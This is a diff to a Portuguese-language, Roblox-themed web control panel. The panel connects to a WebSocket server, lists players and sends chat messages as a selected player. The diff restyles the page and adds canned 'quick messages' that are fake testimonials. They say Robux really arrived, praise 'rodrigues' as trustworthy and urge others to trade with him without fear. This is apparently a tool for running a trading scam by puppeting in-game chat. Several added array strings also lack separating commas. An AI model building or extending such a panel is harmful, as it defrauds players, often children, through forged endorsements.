@@ -7,7 +7,7 @@
 <style>
 body {
   margin:0;
-  background:#f5f5f5;
+  background:#f3f0ff;
   font-family:sans-serif;
   display:flex;
   justify-content:center;
@@ -17,14 +17,14 @@ body {
 .panel {
   width:400px;
   background:white;
-  border-radius:12px;
-  box-shadow:0 5px 20px rgba(0,0,0,0.1);
+  border-radius:14px;
+  box-shadow:0 8px 25px rgba(100, 0, 255, 0.15);
   overflow:hidden;
 }
 
 .header {
   padding:12px;
-  background:#111;
+  background:linear-gradient(90deg,#6a00ff,#9d4edd);
   color:white;
   display:flex;
   justify-content:space-between;
@@ -37,7 +37,7 @@ body {
 
 .title {
   font-size:12px;
-  color:#777;
+  color:#666;
   margin-bottom:6px;
 }
 
@@ -46,21 +46,27 @@ input {
   padding:8px;
   margin-bottom:6px;
   border:1px solid #ddd;
-  border-radius:6px;
+  border-radius:8px;
+  outline:none;
+}
+
+input:focus {
+  border-color:#9d4edd;
 }
 
 .btn {
-  background:#111;
+  background:linear-gradient(90deg,#6a00ff,#9d4edd);
   color:white;
   padding:8px;
   text-align:center;
-  border-radius:6px;
+  border-radius:8px;
   cursor:pointer;
   margin-top:5px;
+  transition:0.15s;
 }
 
 .btn:hover {
-  background:#333;
+  opacity:0.9;
 }
 
 .players {
@@ -70,14 +76,16 @@ input {
 
 .player {
   padding:6px;
-  border-radius:6px;
+  border-radius:8px;
   border:1px solid #eee;
   margin-bottom:4px;
   cursor:pointer;
+  transition:0.1s;
 }
 
 .player:hover {
-  background:#f0f0f0;
+  background:#f0e9ff;
+  border-color:#cdb4ff;
 }
 
 /* mensagens prontas */
@@ -89,14 +97,16 @@ input {
 
 .msg {
   padding:6px;
-  border-radius:6px;
+  border-radius:8px;
   border:1px solid #ddd;
   cursor:pointer;
   font-size:12px;
+  transition:0.1s;
 }
 
 .msg:hover {
-  background:#eee;
+  background:#f0e9ff;
+  border-color:#cdb4ff;
 }
 </style>
 </head>
@@ -110,14 +120,12 @@ input {
   <span id="status">OFF</span>
 </div>
 
-<!-- PLAYERS -->
 <div class="section">
   <div class="title">PLAYERS</div>
   <div id="players" class="players"></div>
   <div class="btn" onclick="refresh()">Refresh</div>
 </div>
 
-<!-- CHAT -->
 <div class="section">
   <div class="title">CHAT</div>
 
@@ -127,14 +135,11 @@ input {
   <div class="btn" onclick="sendChat()">Send</div>
 </div>
 
-<!-- MENSAGENS PRONTAS -->
 <div class="section">
   <div class="title">QUICK MESSAGES</div>
-
   <div class="msgs" id="quickMsgs"></div>
 </div>
 
-<!-- ACTIONS -->
 <div class="section">
   <div class="title">ACTIONS</div>
 
@@ -156,30 +161,38 @@ const playersBox = document.getElementById("players");
 const statusEl = document.getElementById("status");
 const quickBox = document.getElementById("quickMsgs");
 
-// 🔥 SUAS MENSAGENS
+// 🔥 MENSAGENS (ATUALIZADAS)
 const messages = [
 "Oloko Mn chegou Msm achei que era Faike",
 "Muito Confiavel mn!!",
 "Mn , ja que chegou Pss testa??",
 "Obrigado rodrigues Te amo Mn Continue sendo confiavell",
 "Pessoal chegou Msm! AChei que era fake , posso testar Mn?",
-"Mdsssss recebi mesmooo , vou testar para o Pessoal da laive ver que nao e fake"
+"Mdsssss recebi mesmooo , vou testar para o Pessoal da laive ver que nao e fake",
+"Mn muito obrigado por nao me scammar ja fui Mt escamado",
+"Meu deuss Mn vc realizou meus sonhooooo",
+"Caraca mano e muito legal de usar Kakakakakakak"
+"Mn Vc e o unico que tem robux real mnn"
+"Mn Pss testa e kitar pra vc trocar com outras pessoas??"
+"Podem trocar com ele pessoal! Ele e muito confiavel mesmo!!"
+"Confiei e não me arrependi não!!! So troquem com ele!"
+"Rapaziada pode ir sem medo, é real o painel!!"
+"Slk chegou rapido demais nem acreditei"
+"Oloko Mn chega na hora mesmo achei que demorava Kakakakaka"
 ];
 
-// 🔥 RENDER MENSAGENS
+// render msgs
 messages.forEach(m=>{
   const el = document.createElement("div");
   el.className = "msg";
   el.textContent = m;
-
-  el.onclick = ()=>{
-    document.getElementById("msg").value = m;
-  };
-
+  el.onclick = ()=> msgInput.value = m;
   quickBox.appendChild(el);
 });
 
-// 🔥 CONEXÃO
+const msgInput = document.getElementById("msg");
+
+// conexão
 function connect(){
   ws = new WebSocket("wss://luarmor-ws.onrender.com/ws");
 
@@ -200,16 +213,13 @@ function connect(){
   ws.onmessage = (e)=>{
     try{
       const data = JSON.parse(e.data);
-
       if(data.type === "players"){
         renderPlayers(data.list);
       }
-
     }catch{}
   };
 }
 
-// 🔥 PLAYERS
 function renderPlayers(list){
   playersBox.innerHTML = "";
 
@@ -227,14 +237,12 @@ function renderPlayers(list){
   });
 }
 
-// 🔥 SEND
 function send(name){
   if(ws.readyState === 1){
     ws.send(JSON.stringify({button:name}));
   }
 }
 
-// 🔥 CHAT
 function sendChat(){
   const player = document.getElementById("name").value;
   const msg = document.getElementById("msg").value;
@@ -249,7 +257,6 @@ function sendChat(){
   }));
 }
 
-// 🔥 REFRESH
 function refresh(){
   ws.send(JSON.stringify({type:"refresh"}));
 }
